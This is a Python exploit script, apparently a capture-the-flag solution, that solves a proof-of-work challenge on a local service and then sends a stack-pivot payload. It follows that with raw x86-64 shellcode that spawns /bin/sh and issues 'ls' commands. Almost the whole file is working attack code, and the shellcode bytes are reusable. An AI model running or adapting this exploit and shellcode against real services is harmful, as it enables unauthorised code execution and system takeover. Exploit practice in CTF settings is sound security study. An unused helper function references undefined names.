from ptrlib import *
from time import *
from Crypto.Util.number import bytes_to_long
import hashlib

input_addr = 0x401076

def is_valid(digest):
    if sys.version_info.major == 2:
        digest = [ord(i) for i in digest]
    bits = ''.join(bin(i)[2:].zfill(8) for i in digest)
    return bits[:difficulty] == zeros

def solvePow(conn):
    chal = conn.recvline()
    print(chal)
    prefix = chal.split(b'(')[1].split(b'+')[0]
    difficulty = int(chal.split(b'(')[2].split(b')')[0])
    print(prefix)
    print(difficulty)

    i = 0
    while True:
        if i%1000000 == 0:
          print(i)
        i += 1
        s = prefix + str(i).encode()
        if (bytes_to_long(hashlib.sha256(s).digest())>>(256 - difficulty)) == 0:
            conn.sendlineafter(b'> ', str(i).encode())
            assert b'passed' in conn.recvline()
            break

HOST = "localhost"
PORT = 8109

sock = Socket(HOST, PORT)
#sock = Process(["frida", "-q", "-l", "./inst.js", "-f", "./prog"], cwd="../")
#sock = Process("./prog")

solvePow(sock)
print('done')

#input('wait')

fake_stack = 0x040c700 

payload = b''
payload += b'A' * 0x10
payload += p64(fake_stack)
payload += p64(input_addr)
payload += b'A' * 0x10
payload += p64(0x404800)
payload += p64(fake_stack)

assert not b'\n' in payload
sock.sendline(payload)

payload = b''
payload +=  b'\x48\x31\xed\x55\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x54\x5f\x55\x57\x54\x5e\x55\x5a\x6a\x3b\x58\x0f\x05\x6A\x60\x58\x0f\x05'

assert not b'\n' in payload
sock.sendline(payload)

sleep(0.3)

sock.sendline(b'ls\n')
sock.sendline(b'ls\n')
sock.sendline(b'ls\n')

while 1:
  res = sock.recv(1024)
  print(res)
  if not res:
    input()
